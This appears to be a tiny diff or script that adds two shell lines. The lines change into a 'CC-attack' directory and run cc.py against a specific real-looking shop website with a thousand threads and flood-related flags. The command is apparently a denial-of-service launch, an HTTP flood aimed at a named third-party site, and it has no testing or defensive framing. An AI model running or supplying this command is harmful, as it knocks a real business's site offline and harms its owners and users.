@@ -1,0 +1,2 @@
+cd CC-attack
+python3 cc.py -url https://shoproblox.vn/ -v 5 -down -check -t 1000 -s 500
